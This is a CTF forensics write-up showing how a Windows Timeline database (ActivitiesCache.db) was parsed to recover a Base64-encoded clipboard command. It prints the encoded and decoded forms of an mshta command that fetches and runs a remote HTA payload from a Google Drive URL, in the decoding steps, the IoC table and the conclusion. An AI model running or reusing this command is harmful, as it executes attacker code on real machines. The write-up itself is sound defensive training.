# 🚩 Captcha Me If You Can — Digital Forensics CTF Writeup

> A practical Windows Digital Forensics investigation focused on Windows Timeline artifacts, SQLite analysis, timeline reconstruction, Base64 decoding, and LOLBin identification.

---

## 📌 Challenge Overview

| Category | Details |
|---|---|
| 🎯 **CTF** | Black Hat CTF |
| 🔎 **Category** | Digital Forensics |
| 💻 **Target OS** | Windows 10 / 11 |
| 🧩 **Challenge** | Captcha Me If You Can |
| 📂 **Primary Artifact** | Windows Timeline |
| 🗄️ **Database** | `ActivitiesCache.db` |
| 🔍 **Primary Activity** | `CopyPaste` |
| 🛠️ **Primary Tool** | Autopsy |
| ⚙️ **Parser** | WxTCmd |
| 📊 **Analysis Tool** | Timeline Explorer |
| 🧪 **Decoding Tool** | CyberChef |
| ✅ **Status** | Solved |

---

# 📖 Executive Summary

During this digital forensics investigation, a compromised Windows endpoint was examined to identify suspicious activity and determine how a malicious payload was delivered.

The investigation focused on the Windows Timeline database:

```text
ActivitiesCache.db
```

The database contained user activity records, including `CopyPaste` activity.

By extracting and parsing the database, suspicious clipboard activity was identified. The clipboard data contained a Base64-encoded command.

After decoding the Base64 string using CyberChef, the following command was recovered:

```text
mshta https://drive.google.com/uc?export=download&id=1IXGY4txtF-H6NN2cwYVnKNqWxwjkB-ym
```

The investigation therefore revealed the use of:

```text
mshta.exe
        ↓
Remote HTA Payload
        ↓
Google Drive
```

This provided valuable Indicators of Compromise (IoCs) and demonstrated how Windows Timeline artifacts can preserve evidence of user and process activity.

---

# 🎯 Investigation Objective

The main objectives of this investigation were:

1. Identify the Windows Timeline artifact.
2. Extract `ActivitiesCache.db` from the forensic evidence.
3. Parse the SQLite database.
4. Examine Windows user activity records.
5. Identify suspicious `CopyPaste` activity.
6. Recover the encoded clipboard content.
7. Decode the Base64 payload.
8. Identify the execution method.
9. Identify the payload delivery location.
10. Document the Indicators of Compromise (IoCs).

---

# 🧰 Forensic Toolkit

| Tool | Purpose |
|---|---|
| 🔍 **Autopsy** | Disk image analysis and forensic artifact extraction |
| ⚙️ **WxTCmd** | Parsing Windows Timeline database artifacts |
| 📊 **Timeline Explorer** | Searching and filtering parsed timeline data |
| 🧪 **CyberChef** | Base64 decoding and data transformation |
| 🗄️ **SQLite** | Understanding and examining the underlying database |

---

# 🔬 Investigation Methodology

```text
                 FORENSIC EVIDENCE
                        │
                        ▼
                 ┌──────────────┐
                 │   AUTOPSY    │
                 │   Extraction │
                 └──────┬───────┘
                        │
                        ▼
                 ActivitiesCache.db
                        │
                        ▼
                 ┌──────────────┐
                 │    WxTCmd    │
                 │    Parsing   │
                 └──────┬───────┘
                        │
                        ▼
                 Activity CSV Files
                        │
                        ▼
              ┌─────────────────────┐
              │ Timeline Explorer   │
              │ Filtering & Search  │
              └──────────┬──────────┘
                         │
                         ▼
                  CopyPaste Activity
                         │
                         ▼
                Base64 Encoded String
                         │
                         ▼
                    CyberChef
                         │
                         ▼
                  Decoded Command
                         │
                         ▼
                     mshta.exe
                         │
                         ▼
                  Google Drive URL
                         │
                         ▼
                    KEY FINDINGS
```

---

# 🔹 Phase 1 — Disk Image Analysis with Autopsy

The first step was to load the forensic evidence into **Autopsy**.

Autopsy was used to examine the Windows filesystem and locate the Windows Timeline artifact associated with the target user.

The relevant artifact was located under:

```text
C:\Users\Machine\AppData\Local\ConnectedDevicesPlatform\36d13e935c2f2c37\
```

The primary database identified was:

```text
ActivitiesCache.db
```

### 📸 Evidence — Autopsy

![Autopsy Case](Screenshots/01_Autopsy_Case.png)

---

# 🔹 Phase 2 — Extract Windows Timeline Database

The Windows Timeline database contains information about user activities performed on the Windows system.

The primary artifact used in this investigation was:

```text
ActivitiesCache.db
```

The database was safely extracted from the forensic evidence for further analysis.

### 🎯 Target Artifact

```text
ActivitiesCache.db
```

### 📂 Artifact Location

```text
C:\Users\Machine\AppData\Local\ConnectedDevicesPlatform\36d13e935c2f2c37\
```

### 📸 Evidence — ActivitiesCache Database

![ActivitiesCache Database](Screenshots/02_ActivitiesCache.png)

---

# 🔹 Phase 3 — Parse ActivitiesCache.db with WxTCmd

The Windows Timeline database contains structured activity information that can be difficult to examine manually.

For this reason, **WxTCmd** was used to parse the database and generate structured CSV output.

The database was processed using:

```text
WxTCmd.exe
```

The parsing process generated activity information that could then be reviewed using Timeline Explorer.

### 📂 Generated Output

The main output included:

```text
Activity.csv
ActivityOperation.csv
```

The activity CSV contained the primary Windows Timeline activity records.

The operation CSV contained additional operation and synchronization information.

### 📸 Evidence — WxTCmd Output

![WxTCmd Output](Screenshots/03_WxTCmd_Output.png)

---

# 🔹 Phase 4 — Analyze Timeline Data

The parsed activity data was opened in **Timeline Explorer**.

The purpose of this step was to search through the Windows Timeline records and identify suspicious activity.

The investigation focused particularly on:

```text
CopyPaste
```

This activity type was important because clipboard information can sometimes preserve commands, URLs, credentials, scripts, or other data copied by a user or process.

---

## 🔎 Timeline Filtering

The timeline was filtered to reduce normal Windows activity and focus on suspicious records.

Examples of normal activity were observed during the investigation.

The suspicious activity became more interesting when a `CopyPaste` record contained an encoded string associated with PowerShell activity.

### 📸 Evidence — Timeline Explorer

![Timeline Explorer](Screenshots/04_Timeline_Explorer.png)

---

# 🔹 Phase 5 — Identify Suspicious CopyPaste Activity

During the timeline analysis, a suspicious `CopyPaste` activity was identified.

The clipboard record contained an encoded string.

The presence of an encoded command inside clipboard history was significant because it could represent a command prepared for execution.

### 🔎 Suspicious Activity

```text
Activity Type:
CopyPaste
```

The copied content appeared to be Base64 encoded.

### 📸 Evidence — Suspicious CopyPaste Activity

![Suspicious CopyPaste](Screenshots/05_Suspicious_CopyPaste.png)

---

# 🔹 Phase 6 — Recover the Encoded Payload

The encoded clipboard string recovered from the Windows Timeline artifact was:

```text
bXNodGEgaHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL3VjP2V4cG9ydD1kb3dubG9hZCZpZD0xSVhHWTR0eHRGLUg2Tk4yY3dZVm5LTnFXeHdqa0IteW0=
```

The string was identified as Base64 encoded data.

The next step was to decode it.

---

# 🔹 Phase 7 — Decode Using CyberChef

**CyberChef** was used to decode the Base64 string.

### 🧪 CyberChef Operation

```text
From Base64
```

### ⚙️ Input

```text
bXNodGEgaHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL3VjP2V4cG9ydD1kb3dubG9hZCZpZD0xSVhHWTR0eHRGLUg2Tk4yY3dZVm5LTnFXeHdqa0IteW0=
```

### 🔓 Decoded Result

```text
mshta https://drive.google.com/uc?export=download&id=1IXGY4txtF-H6NN2cwYVnKNqWxwjkB-ym
```

### 📸 Evidence — CyberChef

![CyberChef Decoding](Screenshots/06_CyberChef_Decoding.png)

---

# 🚨 Key Findings

The investigation revealed several important findings.

## 1. 🛑 Suspicious LOLBin — mshta.exe

The decoded command uses:

```text
mshta.exe
```

`mshta.exe` is the Microsoft HTML Application Host.

It can execute HTA content and is commonly considered a **Living off the Land Binary (LOLBin)** because it is a legitimate Windows executable that can potentially be abused for malicious execution.

---

## 2. 🌐 Remote Payload Delivery

The decoded command contains a remote Google Drive URL:

```text
https://drive.google.com/uc?export=download&id=1IXGY4txtF-H6NN2cwYVnKNqWxwjkB-ym
```

This indicates that the HTA content was being retrieved from an external location.

---

## 3. 📋 Clipboard Forensic Evidence

The suspicious command was preserved within Windows Timeline activity associated with:

```text
CopyPaste
```

This demonstrates why clipboard-related artifacts can be valuable during a forensic investigation.

---

# 🔗 Reconstructed Attack Chain

```text
User / Process Activity
        │
        ▼
CopyPaste Activity
        │
        ▼
Base64 Encoded Command
        │
        ▼
Base64 Decoding
        │
        ▼
mshta.exe
        │
        ▼
Remote HTA Payload
        │
        ▼
Google Drive
```

---

# 🎯 Indicators of Compromise (IoCs)

| Type | Indicator | Description |
|---|---|---|
| 🛑 LOLBin | `C:\Windows\System32\mshta.exe` | Suspicious execution mechanism |
| 🌐 URL | `https://drive.google.com/uc?export=download&id=1IXGY4txtF-H6NN2cwYVnKNqWxwjkB-ym` | Remote payload location |
| 🌐 Domain | `drive.google.com` | External payload hosting location |
| 🔑 Resource ID | `1IXGY4txtF-H6NN2cwYVnKNqWxwjkB-ym` | Google Drive resource identifier |
| 📋 Activity | `CopyPaste` | Timeline activity containing encoded content |
| 🔐 Encoding | Base64 | Encoding used to conceal the command |

---

# 🧠 Important Forensic Lessons

This investigation demonstrated several important Windows forensic concepts.

### 🔹 Windows Timeline

Windows Timeline artifacts can preserve evidence about activities performed on a Windows system.

```text
User Activity
      ↓
Windows Timeline
      ↓
ActivitiesCache.db
      ↓
Activity Records
```

---

### 🔹 SQLite Database Analysis

`ActivitiesCache.db` is an SQLite database.

This means the artifact can be investigated using SQLite-compatible tools and specialized forensic parsers.

```text
ActivitiesCache.db
       ↓
SQLite Database
       ↓
Tables / Records
       ↓
Activity Information
```

---

### 🔹 Clipboard Forensics

Clipboard activity can sometimes provide valuable evidence.

A clipboard record may contain:

```text
Commands
URLs
Text
Scripts
Credentials
Encoded Data
```

Therefore, `CopyPaste` activities should not automatically be ignored as normal user activity.

---

### 🔹 Base64 Is Encoding, Not Encryption

The suspicious string was Base64 encoded.

Base64 does not provide cryptographic protection.

It simply represents binary/text data using a specific character set.

Therefore:

```text
Encoded Data
     ↓
Base64 Decode
     ↓
Original Text
```

---

### 🔹 LOLBins

The investigation also demonstrated the importance of understanding legitimate Windows binaries that can be abused.

In this case:

```text
mshta.exe
```

was used as the execution mechanism.

---

# 🛠️ Why Multiple Tools Were Used

Each tool served a different purpose during the investigation.

```text
Autopsy
  │
  └── Locate & Extract Evidence
            │
            ▼
         WxTCmd
            │
            └── Parse Timeline Database
                       │
                       ▼
               Timeline Explorer
                       │
                       └── Search & Filter Activity
                                  │
                                  ▼
                              CyberChef
                                  │
                                  └── Decode Payload
```

This demonstrates an important forensic principle:

> No single tool is always sufficient for a complete investigation.

Different forensic tools can complement each other.

---

# 🐍 Optional Python / SQLite Verification

Although the primary investigation was performed using forensic GUI tools and specialized parsers, SQLite and Python can also be useful for verification and automation.

For example, Python can be used to inspect the SQLite database:

```python
import sqlite3

connection = sqlite3.connect("ActivitiesCache.db")

tables = connection.execute(
    "SELECT name FROM sqlite_master WHERE type='table'"
).fetchall()

for table in tables:
    print(table[0])

connection.close()
```

This approach is useful when a forensic investigator wants to understand the underlying database structure or automate repetitive analysis.

---

# 🔬 Practical Investigation Workflow

```text
STEP 01
Load forensic evidence into Autopsy
        ↓
STEP 02
Locate the target Windows user profile
        ↓
STEP 03
Locate ActivitiesCache.db
        ↓
STEP 04
Extract the database
        ↓
STEP 05
Parse database using WxTCmd
        ↓
STEP 06
Open generated CSV in Timeline Explorer
        ↓
STEP 07
Search for suspicious activity
        ↓
STEP 08
Investigate CopyPaste records
        ↓
STEP 09
Recover encoded clipboard content
        ↓
STEP 10
Decode Base64 using CyberChef
        ↓
STEP 11
Identify mshta.exe execution
        ↓
STEP 12
Identify remote payload location
        ↓
STEP 13
Document IoCs
        ↓
FINAL
Reconstruct the attack chain
```

---

# 📸 Evidence Gallery

All investigation screenshots are stored inside the `Screenshots` directory.

### 01 — Autopsy Case

![Autopsy Case](Screenshots/01_Autopsy_Case.png)

### 02 — ActivitiesCache Database

![ActivitiesCache Database](Screenshots/02_ActivitiesCache.png)

### 03 — WxTCmd Output

![WxTCmd Output](Screenshots/03_WxTCmd_Output.png)

### 04 — Timeline Explorer

![Timeline Explorer](Screenshots/04_Timeline_Explorer.png)

### 05 — Suspicious CopyPaste Activity

![Suspicious CopyPaste](Screenshots/05_Suspicious_CopyPaste.png)

### 06 — CyberChef Decoding

![CyberChef Decoding](Screenshots/06_CyberChef_Decoding.png)

---

# 📁 Repository Structure

```text
11_captcha-me-if-you-can-forensics/
│
├── README.md
│
├── Screenshots/
│   ├── 01_Autopsy_Case.png
│   ├── 02_ActivitiesCache.png
│   ├── 03_WxTCmd_Output.png
│   ├── 04_Timeline_Explorer.png
│   ├── 05_Suspicious_CopyPaste.png
│   └── 06_CyberChef_Decoding.png
│
└── Outputs/
    ├── Activity.csv
    └── ActivityOperation.csv
```

> **Note:** Original forensic evidence and disk images should not be uploaded to a public repository unless you have permission to distribute them.

---

# 📚 Skills Practiced

```text
Digital Forensics
       │
       ├── Windows Forensics
       ├── Windows Timeline Analysis
       ├── SQLite Database Analysis
       ├── Artifact Extraction
       ├── WxTCmd
       ├── Timeline Explorer
       ├── Clipboard Forensics
       ├── Base64 Decoding
       ├── CyberChef
       ├── LOLBin Identification
       ├── IoC Identification
       ├── Attack Chain Reconstruction
       └── CTF Investigation Methodology
```

---

# 🏆 Conclusion

The investigation successfully demonstrated how Windows Timeline artifacts can be used to reconstruct suspicious activity on a Windows endpoint.

The investigation started with:

```text
Forensic Evidence
```

and progressed through:

```text
Autopsy
   ↓
ActivitiesCache.db
   ↓
WxTCmd
   ↓
Timeline Explorer
   ↓
CopyPaste Activity
   ↓
Base64 String
   ↓
CyberChef
   ↓
Decoded mshta Command
   ↓
Remote Google Drive Payload
```

The recovered command was:

```text
mshta https://drive.google.com/uc?export=download&id=1IXGY4txtF-H6NN2cwYVnKNqWxwjkB-ym
```

The investigation identified `mshta.exe` as the suspicious execution mechanism and recovered the remote payload location.

---

# ✅ Challenge Status

| Field | Result |
|---|---|
| 🎯 **Challenge** | Captcha Me If You Can |
| 🔎 **Category** | Digital Forensics |
| 💻 **Target** | Windows 10 / 11 |
| 📂 **Artifact** | Windows Timeline |
| 🗄️ **Database** | `ActivitiesCache.db` |
| 🔍 **Key Activity** | `CopyPaste` |
| 🛠️ **Primary Tool** | Autopsy |
| ⚙️ **Parser** | WxTCmd |
| 📊 **Analysis** | Timeline Explorer |
| 🧪 **Decoder** | CyberChef |
| 🛑 **Key Finding** | `mshta.exe` |
| 🌐 **Payload Host** | Google Drive |
| ✅ **Status** | Solved |

---

# 🚩 Final Takeaway

> **Always investigate the artifacts around an event, not just the event itself.**

A suspicious command may disappear from the screen, but traces of its execution can remain inside operating-system artifacts such as the Windows Timeline database.

This challenge provided practical experience in:

```text
Artifact Identification
        +
Evidence Extraction
        +
Database Parsing
        +
Timeline Analysis
        +
Clipboard Investigation
        +
Payload Decoding
        +
IoC Identification
        =
Digital Forensics Investigation
```

---

## ⚠️ Disclaimer

This write-up is intended for **educational, CTF, and authorized digital-forensics training purposes only**.

All analysis should be performed on systems and evidence for which you have proper authorization.
